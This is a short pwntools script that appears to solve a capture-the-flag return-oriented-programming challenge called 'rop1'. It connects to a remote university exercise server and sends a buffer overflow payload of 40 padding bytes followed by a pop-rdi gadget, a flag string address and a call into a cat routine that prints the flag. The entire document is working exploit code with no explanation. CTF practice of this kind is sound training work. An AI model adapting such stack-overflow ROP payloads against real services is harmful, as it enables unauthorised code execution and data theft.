from pwn import *

elf = ELF('./rop1')
context.binary = elf

p = remote("lettieri.iet.unipi.it", 4491)

rdi_gadget = 0x4015fb  # pop rdi ; ret
flag_addr = 0x402063
cat_addr = 0x401252

payload = b"A" * 40
payload += p64(rdi_gadget)
payload += p64(flag_addr)
payload += p64(cat_addr)


p.sendline(payload)
p.interactive()
